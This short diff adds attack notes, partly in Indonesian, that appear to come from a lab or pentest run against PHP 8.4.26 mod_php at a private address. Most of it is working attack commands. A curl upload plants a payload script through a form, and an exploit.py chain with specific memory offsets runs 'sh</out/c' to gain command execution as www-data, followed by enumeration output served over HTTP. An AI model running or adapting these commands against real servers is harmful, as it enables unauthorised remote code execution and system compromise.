@@ -1,0 +1,17 @@
+Foothold: PHP2Shell CVE-2026-109618 (PHP 8.4.26 mod_php).
+
+# Upload script payload lewat form upload
+curl -sS -F 'PHP_SESSION_UPLOAD_PROGRESS=x' \
+  -F 'file=@script;filename=c' http://10.10.20.22/upload.php
+
+# Jalankan chain; command max 14 byte -> sh</out/c
+cd /tmp/p2s
+python3 exploit.py -u http://10.10.20.22/index.php \
+  --offsets-file '' --no-auto-offsets --proof-file '' --fetch /out/p1 \
+  -c 'sh</out/c' \
+  --zif-offset 0x465370 --dtor-offset 0x65eb60 \
+  --htdata-offset 0x690d8 --huge-mb 12 --retries 3 --timeout 90
+
+Hasil: command execution sebagai www-data.
+Script /out/c menjalankan enumerasi dan menulis hasil ke /out/*.txt
+(recon.txt, src.txt, ucp.txt, root.txt) yang bisa dibaca via HTTP.
